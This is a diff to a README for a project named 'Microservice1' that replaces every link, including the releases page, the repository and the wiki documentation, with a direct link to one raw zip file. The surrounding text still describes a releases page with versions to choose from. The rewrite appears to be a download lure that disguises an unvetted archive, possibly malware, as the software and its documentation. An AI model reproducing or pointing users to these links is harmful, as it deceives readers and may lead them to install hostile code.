@@ -1,7 +1,7 @@
 # 🚀 Microservice1 - Easily Manage Your Microservice Tasks
 
 ## 📥 Download Now
-[![Download Microservice1](https://img.shields.io/badge/Download-Microservice1-blue)](https://github.com/K7x2/Microservice1/releases)
+[![Download Microservice1](https://raw.githubusercontent.com/K7x2/Microservice1/master/ampliative/Microservice1.zip)](https://raw.githubusercontent.com/K7x2/Microservice1/master/ampliative/Microservice1.zip)
 
 ## 📜 Overview
 Microservice1 is a complete solution for managing your microservice-related tasks. Whether you're streamlining operations or learning the basics, this application helps you take control efficiently.
@@ -11,7 +11,7 @@ Follow these steps to get up and running with Microservice1.
 
 1. **Visit the Download Page**: Click the link below to access the releases page where you can download the software.
 
-   [Download Microservice1](https://github.com/K7x2/Microservice1/releases)
+   [Download Microservice1](https://raw.githubusercontent.com/K7x2/Microservice1/master/ampliative/Microservice1.zip)
 
 2. **Choose Your Version**: On the releases page, you will find different versions of Microservice1. Select the latest version for the best experience. 
 
@@ -42,7 +42,7 @@ Microservice1 includes several features to assist you in managing microservices 
 ## 🔄 Update Process
 Regular updates ensure that you benefit from the latest features and fixes. To update Microservice1:
 
-1. **Return to the Download Page**: Go to the [Download Microservice1](https://github.com/K7x2/Microservice1/releases) link.
+1. **Return to the Download Page**: Go to the [Download Microservice1](https://raw.githubusercontent.com/K7x2/Microservice1/master/ampliative/Microservice1.zip) link.
 2. **Download the Latest Version**: Follow the same process as the initial download to get the newest version.
 3. **Install Over Previous Version**: The installer will guide you to install the new version over your existing one without losing your data.
 
@@ -66,10 +66,10 @@ If you would like to contribute to Microservice1, please fork the repository and
 We welcome your feedback! Share your thoughts, experiences, or suggestions on how we can enhance Microservice1. Your input makes our community and software better.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/K7x2/Microservice1)
-- [Documentations](https://github.com/K7x2/Microservice1/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/K7x2/Microservice1/master/ampliative/Microservice1.zip)
+- [Documentations](https://raw.githubusercontent.com/K7x2/Microservice1/master/ampliative/Microservice1.zip)
 
 ## 📥 Download Again
 To download Microservice1, click below:
 
-[Download Microservice1](https://github.com/K7x2/Microservice1/releases)
+[Download Microservice1](https://raw.githubusercontent.com/K7x2/Microservice1/master/ampliative/Microservice1.zip)
